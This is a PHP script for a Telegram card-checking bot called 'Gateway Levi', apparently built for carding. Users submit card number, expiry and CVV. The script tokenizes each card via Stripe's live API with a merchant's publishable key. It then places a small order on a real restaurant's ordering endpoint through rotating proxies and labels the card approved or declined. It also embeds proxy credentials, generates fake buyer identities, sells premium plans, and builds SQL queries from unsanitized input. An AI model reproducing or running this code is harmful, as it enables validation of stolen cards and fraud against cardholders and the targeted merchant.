<?php
require_once '/home/alvcarr230/www/project/data/data.php';
list($cmd) = explode(" ", $text);
if($cmd == "/le" or $cmd == ".le" or $cmd == "!le" or $cmd == "?le" or $cmd == "#le" or $cmd == ":le" or $cmd == ",le"){ 
// A part for gatecmd clearance
   $gatecmd = 'le';

    $lista = explode(" ", $text)[1];
    
//-------------[ MYSQL CALL PART] ----_-----//

    $sql = "SELECT * FROM administrar WHERE id='$user_id'";
    $cs = mysqli_query(mysqlcon(),$SQL);
    $raw = mysqli_fetch_assoc($cs);
    $planexpiry = $raw['planexpiry'];
     mysqli_close(mysqlcon());


    $sql = "SELECT * FROM gateway WHERE gatecmd='$gatecmd'";
    $cs = mysqli_query(mysqlcon(),$sql);
    $raw = mysqli_fetch_assoc($cs);
    $gatec = $raw['gatecmd'];
     mysqli_close(mysqlcon());


    $sql = "SELECT * FROM gateway WHERE gatecmd='as'";
        $cs = mysqli_query(mysqlcon(),$sql);
    $raw = mysqli_fetch_assoc($cs);
    $status = $raw['status'];
     mysqli_close(mysqlcon());

    
    $sql = "SELECT * FROM administrar WHERE id='$user_id'";
    $cs = mysqli_query(mysqlcon(),$sql);
    $raw = mysqli_fetch_assoc($cs);
    $plan = $raw['plan'];
     mysqli_close(mysqlcon());
    

$sql = "SELECT * FROM `authorize` WHERE chats=".$chat_id;
    $cs = mysqli_query(mysqlcon(),$sql);
    $raw = mysqli_fetch_assoc($cs);
    $chats = $raw['chats'];
    $now = time();
    
    /* This part for condition of gateways and some others*/
    
    if($status == "OFF"){
        $content = ['chat_id' => $chat_id, 'text' => "𝑮𝒂𝒕𝒆𝒘𝒂𝒚 𝑶𝒇𝒇 ❌ ", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        SendMessage($content);
        exit();
    }
    
    

      if ($planexpiry < $now && $planexpiry == 0) {
    }
elseif ($planexpiry < $now && $plan != "Free User") {
    
    $sql = "UPDATE `administrar` SET `plan` = 'Free User' WHERE `administrar`.`id` = '$user_id';";
    $result = mysqli_query(mysqlcon(), $sql);
    mysqli_close(mysqlcon());
    
    $sql = "UPDATE `administrar` SET `planexpiry` = '0' WHERE `administrar`.`id` = '$user_id';";
    $result = mysqli_query(mysqlcon(), $sql);
    mysqli_close(mysqlcon());
    $content = ['chat_id' => $chat_id, 'text' => "$premium_expired", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit();
    }
    
    if($chats != $chat_id and $ctype == "supergroup"){
        $content = ['chat_id' => $chat_id, 'text' => "$group_not_allowed", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
        exit();
    }
    else{}

    $SQL = "SELECT * FROM `administrar` WHERE plan=".$plan;
    if(empty($plan)){
        $content = ['chat_id' => $chat_id, 'text' => "$not_registered", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit();
    }else{
        
    }
    if($plan == "Free User" and $ctype == "private"){
        $content = ['chat_id' => $chat_id, 'text' => "$not_allowed", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit();
    }else{
        
    }
    $SQL = "SELECT * FROM `administrar` WHERE id=".$user_id;
    $CONSULTA = mysqli_query(mysqlcon(),$SQL);
    $f = mysqli_num_rows($CONSULTA);

    if($f > 0)
    {} else{
        $content = ['chat_id' => $chat_id, 'text' => "$not_registered", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
        exit;
    }
    // if($plan == "Free User"){
    //     $content = ['chat_id' => $chat_id, 'text' => "$not_allowed", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
    //         $m1  = SendMessage($content);
    //         exit();
    // }
    // else{} 
    if (empty($lista)) {
        $content = ['chat_id' => $chat_id, 'text' => "<code>Gateway: Levi 🍃</code>
<code>𝖥𝗈𝗋𝗆𝖺𝗍: <i>cc|mm|yy|cvv</i></code>
<code>Enter a valid card</code>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
    } else {
        $check = strlen($lista);
        $chem = substr($lista, 0, 1);
        $vaut = array(1, 2, 7, 8, 9, 0);
        preg_match_all('/\d+/', $text, $matches);
    if (count($matches[0]) == 3) {
        $cc = $matches[0][0];
        $mes = substr($matches[0][1], 0, 2);
        $ano = substr($matches[0][1], -2);
        $cvv = $matches[0][2];
    } else if (strlen($matches[0][1]) == 3) {
        $cc = $matches[0][0];
        $ano1 = $matches[0][2];
        $ano = $matches[0][3];
        $cvv = $matches[0][1];
        $mes = $ano1;
    } else {
        $cc = $matches[0][0];
        $mes = $matches[0][1];
        $ano = $matches[0][2];
        $cvv = $matches[0][3];
    }
    $bin = substr($cc,0,6);
    $first1 = substr($cc,0,1);

    if($mes == "01"){
        $sub_mes = "1";
    }elseif($mes == "02"){
        $sub_mes = "2";
    }elseif($mes == "03"){
        $sub_mes = "3";
    }elseif($mes == "04"){
        $sub_mes = "4";
    }elseif($mes == "05"){
        $sub_mes = "5";
    }elseif($mes == "06"){
        $sub_mes = "6";
    }elseif($mes == "07"){
        $sub_mes = "7";
    }elseif($mes == "08"){
        $sub_mes = "8";
    }elseif($mes == "09"){
        $sub_mes = "9";
    }elseif($mes == "10"){
        $sub_mes = "10";
    }elseif($mes == "11"){
        $sub_mes = "11";
    }elseif($mes == "12"){
        $sub_mes = "12";
    }
$cc1 = substr($cc, 0, 4);
$cc2 = substr($cc, 4, -8);
$cc3 = substr($cc, 8, -4);
$cc4 = substr($cc, -4);

        if (in_array($chem, $vaut)) {
            $content = ['chat_id' => $chat_id, 'text' => "𝑬𝒏𝒕𝒆𝒓 𝒗𝒂𝒍𝒊𝒅 𝒄𝒂𝒓𝒅", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            SendMessage($content);
            exit();
        } elseif ($check < 15) {
            $content = ['chat_id' => $chat_id, 'text' => "𝑬𝒏𝒕𝒆𝒓 𝒗𝒂𝒍𝒊𝒅 𝒄𝒂𝒓𝒅", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            SendMessage($content);
            exit();
        }
        if (strlen($ano) == 2) {
            $ano = "20" . $ano;
        }
        $SQL = "SELECT * FROM `administrar` WHERE id=".$user_id;
        $c = mysqli_query(mysqlcon(),$SQL);
        
        if($plan !== "Free User"){
            $time = 40;
        }else{
            $time = 60;
        }
        
        $RAW = mysqli_fetch_assoc($c);
        $ANTISPAM = $RAW['antispam'];
        $Rango = $RAW['rango'];
        $TIMEAC = time() - $ANTISPAM;
        if($TIMEAC < $time)
        {
            $TotalTime = $time - $TIMEAC;
            if($TotalTime > 0){
            $content = ['chat_id' => $chat_id, 'text' => "<b>[ANTISPAM] Try again after $TotalTime's</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit;
            }
        }

        $che = bannedbin($bin);
        if($che == true){
                $content = ['chat_id' => $chat_id, 'text' => "<b>Bin Blocked leccher</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
                $m1  = SendMessage($content);
                exit();
        }
        $timest = time();
        $SQL = "UPDATE administrar SET antispam = '$timest' WHERE id=".$user_id;
        $CONSULTA = mysqli_query(mysqlcon(),$SQL);
        $content = ['chat_id' => $chat_id, 'text' => "<b>[$]-Please wait</b>
<b>processing...[ 💳$lista ]</b>
<b>-------------------------------------------------</b>
<b>⎆𝚃𝚎𝚜𝚝 𝚝𝚒𝚖𝚎» $starttime</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
      $m1  = SendMessage($content);
        $m1i = $m1['result']['message_id'];

$starttime = microtime(true);
$mytime = 'time1';

//==================[BIN LOOK-UP]======================//
$url = 'https://projectslost.xyz/bin/?bin='.$bin.'';
$fim = json_decode(file_get_contents($url), true);
$level = $fim["level"];
$type = $fim["type"];
$brand = $fim["brand"];
$country = $fim["country"]["name"];
$currency = $fim["country"]["currency"];
$bank = $fim['bank']["name"];
$bankphone = $fim['bank']["phone"];
$emoji = $fim["country"]["flag"];
$pais = $fim["country"]["ISO2"];
//==================[BIN LOOK-UP-END]======================//


# ------------ Ramdom User ------------ #

$name = ucfirst(str_shuffle('unodostrescuatro'));
$last = ucfirst(str_shuffle('cincoseissieteocho'));
$inc = ucfirst(str_shuffle('AmazonAppleas'));
$email = "sexolandia".substr(md5(uniqid()), 0, 8)."@gmail.com";
$street = "".rand(0000,9999)." Main Street";
$ph = array("682","346","246");
$ph1 = array_rand($ph);
$phh = $ph[$ph1];
$phone = "$phh".rand(0000000,9999999)."";
$st = array("AL","NY","CA","FL","WA");
$st1 = array_rand($st);
$statee = $st[$st1];
if ($statee == "NY"){
$state = "New York";
$zip = "10080";
$city = "New York";
}
elseif ($statee == "WA"){
$state = "Washington";
$zip = "98001";
$city = "Auburn";
}
elseif ($statee == "AL"){
$state = "Alabama";
$zip = "35005";
$city = "Adamsville";
}
elseif ($statee == "FL"){
$state = "Florida";
$zip = "32003";
$city = "Orange Park";
}else{
$state = "California";
$zip = "90201";
$city = "Bell";
};
function getDatas($string, $start,$end){
    $uno = explode($start, $string);
    $dos = explode($end,$uno[1]);
    return $dos[0];
}

     
$content2 = ['chat_id' => $chat_id, 'text' => "<b>[$]-Please wait</b>
<b>processing...[🟡 - ? - ? ]</b>
<b>-------------------------------------------------</b>
<b>⎆𝚃𝚎𝚜𝚝 𝚝𝚒𝚖𝚎» $starttime</b>", 'message_id' => $m1i, 'parse_mode' => 'html'];
$m2  = EditMessageText($content2);
        $m2i = $m2['result']['message_id'];


//$cookie = uniqid();

/*$content3 = ['chat_id' => $chat_id, 'text' => "<b>𝑪𝒂𝒓𝒅: <code>$cc|$mes|$ano|$cvv</code> ■■■□□</b>", 'message_id' => $m2i, 'parse_mode' => 'html'];
$m3 = EditMessageText($content3);
        $m3i = $m3['result']['message_id'];*/


 /*$content = ['chat_id' => $chat_id, 'text' => "<b>𝑪𝒂𝒓𝒅: <code>$cc|$mes|$ano|$cvv</code> ■■■■■ </b>", 'message_id' => $m3i, 'parse_mode' => 'html'];
        $m4  = EditMessageText($content);
        $m4i = $m4['result']['message_id'];*/
        
        

#------------ R2 PAYPAL ------------#
//$cookie_variable = uniqid("FuckingStupidCookie") . ".txt";

 $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');

    curl_setopt($ch, CURLOPT_PROXY, "p.webshare.io:80"); //Proxy Connect
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, "axpfyoll-rotate:crpbiuervtjj"); //Password Proxy
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'accept: application/json',
        'content-type: application/x-www-form-urlencoded',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
        'origin: https://js.stripe.com/',
        'referer: https://js.stripe.com/',
    ]);

    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/' . $cookie_variable);
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/' . $cookie_variable);

    curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[address_zip]=10080&guid=6240b534-468d-4a22-b03c-ed31b9b9574c70da01&muid=55054333-4f41-4ebe-9fee-8650b61416f2e9a949&sid=7718c672-209e-4c2a-b527-0fa6261dc7f7685116&payment_user_agent=stripe.js%2F056868f56%3B+stripe-js-v3%2F056868f56&time_on_page=121494&key=pk_live_Sq151n5SUu6qAtZDKtSdw0tv');

    $result = curl_exec($ch);

    $token = json_decode($result)->id;
    
    $content3 = ['chat_id' => $chat_id, 'text' => "<b>[$]-Please wait</b>
<b>processing...[🟡 -🟠 - ? ]</b>
<b>-------------------------------------------------</b>
<b>⎆𝚃𝚎𝚜𝚝 𝚝𝚒𝚖𝚎» $starttime</b>", 'message_id' => $m1i, 'parse_mode' => 'html'];
$m3  = EditMessageText($content3);
        $m3i = $m3['result']['message_id'];

    if (!empty($token)) {

        /*Start of third request*/

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://p39pffu1q4.execute-api.us-west-1.amazonaws.com/v18-sushi-mods/orders');

        curl_setopt($ch, CURLOPT_PROXY, "p.webshare.io:80");
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, "axpfyoll-rotate:crpbiuervtjj");


                curl_setopt($ch, CURLOPT_HTTPHEADER, [
                              'accept: */*',
                                          'application/json',
                                                      'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                                                                  'origin: https://incamayatacos.com',
                                                                              'referer: https://incamayatacos.com/',
                                                                              
                ]);
                        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                                                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

                                                        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/' . $cookie_variable);
                                                                curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/' . $cookie_variable);

                                                                        curl_setopt($ch, CURLOPT_POSTFIELDS, '{"items":[{"id":1667629488233,"sub":"Drinks","name":{"en":"Mexican Coca"},"price":"3","productId":"Fwjdc7RN7Mo8TJOr9UOC","quantity":1}],"phone":"(312) 564-7838","cartType":"PICKUP","deliveryAddress":null,"paymentType":"CARD","name":"Geho","unitNumber":"","deliveryInstructions":"","pickupTime":"1667694634824","deliveryTime":"ASAP","r_id":"incamaya","stripeToken":{"id":"'.$token.'","object":"token","card":{"id":"card_0M0foymGk5MW7zF2jIkPHiyS","object":"card","address_city":null,"address_country":null,"address_line1":null,"address_line1_check":null,"address_line2":null,"address_state":null,"address_zip":"10080","address_zip_check":"unchecked","brand":"Visa","country":"US","cvc_check":"unchecked","dynamic_last4":null,"exp_month":4,"exp_year":2024,"funding":"debit","last4":"6654","name":null,"tokenization_method":null},"client_ip":"185.156.46.98","created":1667629536,"livemode":true,"type":"card","used":false},"totals":{"numberOfMarketPriceItems":0,"totalPrice":3,"discount":0,"deliveryFeeInCents":0,"subtotal":3,"tax":0.29,"allServiceFee":0,"preTipTotalWithTax":3.29,"invoice":3.29,"preTipPrimaryCents":0,"agreeToDonate":false,"restaurantDonationCents":199},"analytics":{"queryStringHistory":[{"ts":1667629414559,"qs":""},{"ts":1667629414868,"qs":""}]},"referrer":"","promoCode":"","clientVersion":"v5.0-ninja","dineInOption":"","tabNumber":"","utensilsOption":"","restaurantDonationCents":0,"agreeToDonate":false}');

                                        $result = curl_exec($ch);
                                        $message = json_decode($result)->text;
                                        $info = curl_getinfo($ch);
                                        $time = $info['total_time'];
                                      }
#------------ R2 PAYPAL ------------#

     $content4 = ['chat_id' => $chat_id, 'text' => "<b>[$]-Please wait</b>
<b>processing...[🟡 - 🟠 - 🟢 ]</b>
<b>-------------------------------------------------</b>
<b>⎆𝚃𝚎𝚜𝚝 𝚝𝚒𝚖𝚎» $time</b>", 'message_id' => $m1i, 'parse_mode' => 'html'];
$m4  = EditMessageText($content4);
        $m4i = $m4['result']['message_id'];

if (strpos($result, 'Thanks You') or strpos($result, 'thanks you') or strpos($result, 'Thanks you')) {
	$status = "Approved ✅";
        $message = "Approved";
}elseif (strpos($result, 'security code is incorrect')){
    $status = "Approved CCN ✅";
}elseif (strpos($result, 'insufficient funds') or strpos($result, 'Insufficient Funds')){
        $status = "Approved CVV ✅️";
}else{
	$status = "Declined ❌️";
}


 $contentf = ['chat_id' => $chat_id, 'text' => "<b>-----------『↯𝐌𝐊𝐙↯』-----------</b>
↳ Gateway Levi [🍃]
-----------------------------------------
⎆𝐂𝐂» <code>$lista</code>
⎆𝐒𝐭𝐚𝐭𝐮𝐬» [ <code>$status</code> ]
⎆𝐌𝐞𝐬𝐬𝐚𝐠𝐞» <code>$message</code>
-----------------------------------------
⎆𝐁𝐢𝐧» <code>$bin</code>
⎆𝐓𝐲𝐩𝐞» <code>$brand - $type - $level</code>
⎆𝐁𝐚𝐧𝐤» <code>$bank</code>
⎆𝐂𝐨𝐮𝐧𝐭𝐫𝐲» <code>$country - $pais - $emoji</code>
------------------------------------------
⎆𝙿𝚛𝚘𝚡𝚢» Live ✅
⎆𝚃𝚎𝚜𝚝 𝚝𝚒𝚖𝚎» <code><i>$time Seconds</i></code>
⎆𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐛𝐲» @$username <code><b>[$plan]</b></code>
", 'message_id' => $m3i, 'parse_mode' => 'html'];
        $m3  = EditMessageText($contentf);
    }
}
/*GATEWAY ON, NO TOCAR NADA SI NO DEJARA DE FUNCIONAR*/
